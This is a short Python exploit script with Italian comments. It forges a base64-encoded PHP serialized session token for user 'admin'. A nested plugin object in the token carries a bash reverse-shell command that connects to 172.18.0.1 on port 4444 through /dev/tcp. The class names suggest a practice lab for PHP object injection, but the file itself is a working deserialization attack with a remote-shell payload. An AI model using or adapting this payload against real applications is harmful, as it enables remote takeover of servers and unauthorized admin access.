#!/usr/bin/env python3


import base64


def php_string(value):
    """Converte una stringa Python nel formato PHP serialized."""
    return f's:{len(value)}:"{value}";'


def php_object(class_name, properties):
    """Costruisce un oggetto PHP serializzato."""

    result = f'O:{len(class_name)}:"{class_name}":{len(properties)}:{{'

    for name, value in properties.items():

        # Nome della proprietà
        result += php_string(name)

        # Stringa
        if isinstance(value, str):
            result += php_string(value)

        # Oggetto annidato
        elif isinstance(value, dict):
            result += serialize(value)

        else:
            raise TypeError(f"Tipo non supportato: {type(value)}")

    result += "}"

    return result


def serialize(data):
    class_name = data["class"]
    properties = data["properties"]

    return php_object(class_name, properties)


def encode_token(serialized):
    raw = serialized.encode("utf-8")
    return base64.b64encode(raw).decode("ascii")


data = {
    "class": "Lab\\Models\\LegacySession",
    "properties": {
        "username": "admin",
        "plugin": {
            "class": "Lab\\Plugins\\LegacyMaintenance",
            
            "properties": {"command": "bash -c 'bash -i >& /dev/tcp/172.18.0.1/4444 0>&1'"
            } #{ }
        }
    }
}


serialized = serialize(data)

print("[+] PHP serialized:")
print(serialized)

token = encode_token(serialized)

print("\n[+] Base64 token:")
print(token)